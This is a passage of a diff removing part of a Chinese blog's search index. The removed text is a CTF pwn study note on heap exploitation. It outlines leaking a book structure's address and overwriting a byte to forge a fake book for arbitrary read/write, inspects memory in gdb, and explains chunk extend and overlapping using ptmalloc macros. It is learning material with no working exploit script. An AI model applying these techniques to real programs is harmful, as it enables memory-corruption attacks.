-<li>调用print泄漏第一个book结构的地址</li>
-<li>创建第二个book</li>
-<li>更改author name，再次覆盖掉book1的一个字节，这样使得其指向的空间变大，并且指向了book1的description部分，实际上是一个伪造的book</li>
-<li>由于有edit函数和print函数，且book1中伪造的book是可控的，导致实际上可以任意地址读写</li>
-</ol>
-<p>首先读到地址</p>
-<p><img src="heap-overflow/image-20200929210106951.png" alt="image-20200929210106951"></p>
-<p>这边转换之后得到一个数字，连接到gdb里面查看一下内存</p>
-<p><img src="heap-overflow/image-20200929210131532.png" alt="image-20200929210131532"></p>
-<p>可以看到这一块区域首先是一个1，之后是一个指向<code>0x5433d372b0</code>的指针，紧跟着是一个<code>0x5433d372e0</code>的指针</p>
-<p>输出一下发现<code>b0</code>这里面是32个字节的b；也就是我们输入的书的name区域</p>
-<p><img src="heap-overflow/image-20200929211751690.png" alt="image-20200929211751690"></p>
-<p>之后发现另一个<code>e0</code>这个区域是我们输入的description</p>
-<p><img src="heap-overflow/image-20200929212122897.png" alt="image-20200929212122897"></p>
-<p>有内容的部分包括0，上面有128个字节，之后一个0，一个31；</p>
-<p>我们之前有学过了chunk的结构，首先每一个chunk起始的一个字是存着前一个chunk的size；之后是自己这个chunk的size</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/20044065-905e3579f0f56746.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/703" alt="img"></p>
-<h2 id="Chunk-Extend"><a href="#Chunk-Extend" class="headerlink" title="Chunk-Extend"></a>Chunk-Extend</h2><p>chunk extend在对堆进行扩展时可能会出现overlapping的情况</p>
-<p>即不同的堆块之间造成重叠；</p>
-<p>利用需要以下条件：</p>
-<ul>
-<li>程序中存在基于堆的漏洞</li>
-<li>漏洞可以控制chunk header中的数据</li>
-</ul>
-<p>类似的还有一种利用方式是chunk shrink</p>
-<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>由于在ptmalloc中对堆的各种操作是很频繁的，因此其中的很多操作直接是以宏的形式实现的；</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *)(p))+chunksize(p)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_chunk(p) ((mchunkptr)((char *)(p) - prev_size(p)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse(p) ((((mchunkptr) (((char *)(p))+chunksize(p))) -&gt; mchunk_size) &amp; PREV_INUSE)</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Pwn</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>linux</tag>
-      </tags>
   </entry>
 </search>
